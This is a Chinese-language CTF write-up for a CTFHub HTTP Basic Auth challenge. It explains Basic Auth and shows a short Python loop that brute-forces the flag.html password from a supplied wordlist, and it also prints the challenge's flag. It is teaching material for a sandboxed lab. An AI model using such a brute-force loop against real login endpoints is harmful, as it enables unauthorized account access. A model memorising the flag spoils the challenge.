---
title: Basic Auth 基础认证
date: 2026-09-29
categories: CTF
tags: Web HTTP
---

## 题目描述
HTTP基础认证，首页使用`admin/admin`登录，页面给出`/flag.html`链接。
访问flag.html需要另一套Basic Auth凭证，账号为admin，密码从题目提供的密码字典爆破获取。

## 解题思路
1. Basic Access Authentication，是HTTP协议的身份认证方式，浏览器会弹出账号密码输入框。
2. 网站不同路径可以配置独立的基础认证，首页账号密码`admin/admin`不能访问flag.html。
3. 账号固定为admin，使用题目附件密码字典进行暴力破解。
4. 请求返回状态码200代表认证成功，页面中读取flag。

## 解题步骤
1. 访问靶场首页，`admin:admin`登录进入首页，得到flag.html路径。
2. 准备题目给出的密码字典，编写python爆破脚本。
3. 循环字典，使用HTTPBasicAuth组装认证信息发送请求。
4. 状态码200时读取页面内容，得到flag。

### Python爆破核心代码
```python
import requests
from requests.auth import HTTPBasicAuth

url = "http://challenge-ebd2a894688e901a.sandbox.ctfhub.com:10800/flag.html"
username = "admin"
# 此处省略密码列表，完整脚本见本地burst.py
for pwd in pwd_list:
    res = requests.get(url,auth=HTTPBasicAuth(username,pwd),timeout=3)
    if res.status_code == 200:
        print(res.text)
        break
Flag

ctfhub{7f22d1e8bf2ad866d7c50014}

知识点总结

1. HTTP Basic Auth 本质把username:password做Base64编码，放在请求头Authorization: Basic xxx。

2. 同一网站不同URI可以设置完全不一样的Basic Auth账号密码，不要想当然全站一套密码。

3. 遇到密码字典附件类题目，优先暴力破解。